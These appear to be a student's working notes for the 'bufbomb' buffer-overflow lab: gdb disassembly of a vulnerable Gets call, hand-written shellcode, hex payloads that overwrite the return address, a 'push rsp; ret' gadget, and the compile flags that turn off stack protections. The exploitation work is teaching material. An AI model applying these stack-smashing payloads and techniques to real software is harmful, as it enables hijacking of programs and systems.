130     {
   0x0000000000401cd2 <+0>:     55      push   rbp
   0x0000000000401cd3 <+1>:     48 89 e5        mov    rbp,rsp
   0x0000000000401cd6 <+4>:     48 83 ec 30     sub    rsp,0x30
   0x0000000000401cda <+8>:     48 89 7d d8     mov    QWORD PTR [rbp-0x28],rdi
   0x0000000000401cde <+12>:    89 75 d4        mov    DWORD PTR [rbp-0x2c],esi

131         char buf[NORMAL_BUFFER_SIZE];
132             printf("bufn:%p\n", &buf);
   0x0000000000401ce1 <+15>:    48 8d 45 e0     lea    rax,[rbp-0x20]
   0x0000000000401ce5 <+19>:    48 89 c6        mov    rsi,rax
   0x0000000000401ce8 <+22>:    48 8d 05 f8 05 00 00    lea    rax,[rip+0x5f8]        # 0x4022e7
   0x0000000000401cef <+29>:    48 89 c7        mov    rdi,rax
   0x0000000000401cf2 <+32>:    b8 00 00 00 00  mov    eax,0x0
   0x0000000000401cf7 <+37>:    e8 94 f3 ff ff  call   0x401090 <printf@plt>

133         Gets(buf, src, len);
   0x0000000000401cfc <+42>:    8b 55 d4        mov    edx,DWORD PTR [rbp-0x2c]
   0x0000000000401cff <+45>:    48 8b 4d d8     mov    rcx,QWORD PTR [rbp-0x28]
   0x0000000000401d03 <+49>:    48 8d 45 e0     lea    rax,[rbp-0x20]
   0x0000000000401d07 <+53>:    48 89 ce        mov    rsi,rcx
   0x0000000000401d0a <+56>:    48 89 c7        mov    rdi,rax
   0x0000000000401d0d <+59>:    e8 68 f9 ff ff  call   0x40167a <Gets>

134         return 1;
   0x0000000000401d12 <+64>:    b8 01 00 00 00  mov    eax,0x1

--Type <RET> for more, q to quit, c to continue without paging--
135     }
   0x0000000000401d17 <+69>:    c9      leave
   0x0000000000401d18 <+70>:    c3      ret




目标 修改eax，保持rbp不变
0x401dcc
&gets_buf = 0x404160 
rbp-0x20
0x404128
rsp - 0x1d 
mov eax jmp eax


mov 0x4e8348, %eax
mov %rsp, %rbp
add $0x30, %rbp
push $0x401d1e
ret 

   0:   8b 04 25 48 83 4e 00    mov    0x4e8348,%eax
   7:   48 89 e5                mov    %rsp,%rbp
   a:   48 83 c5 30             add    $0x30,%rbp
   e:   68 1e 1d 40 00          push   $0x401d1e
  13:   c3                      ret    

b8 c3 7d 0d 0c
48 89 e5
48 83 c5 30
68 3f 15 40 00
c3 
00 00 00
00 00 00
00 00 00 00 00
00 00 00 00
00 00 00 00 00 00 00
cc 1d 40 00 00 00 00 00

b8 c3 7d 0d 0c
48 89 e5
48 83 c5 30
68 3f 15 40 00
c3 
00 00 00
00 00 00
00 00 00 00 00
00 00 00 00
00 00 00 00 00 00 00
62 7f 42 00 00 00 00 00
b8 c3 7d 0d 0c
48 89 e5
48 83 c5 30
68 1e 1d 40 00
c3 

gcc -static -g -D U5 -fno-stack-protector -no-pie -fcf-protection=none -z execstack bufbomb.c buf.c support.c -o bufbomb


0x0000000000427f62 : push rsp ; ret

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
62 7f 42 00 00 00 00 00 // push rsp; ret
8b 04 25 48 83 4e 00   // mov    0x4e8348,%eax
48 89 e5               // mov    %rsp,%rbp
48 83 c5 30            // add    $0x30,%rbp
68 1e 1d 40 00         // push   $0x401d1e
c3                     // ret    



00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
62 7f 42 00 00 00 00 00 
8b 04 25 48 83 4e 00   
48 89 e5               
48 83 c5 30            
68 1e 1d 40 00          
c3                     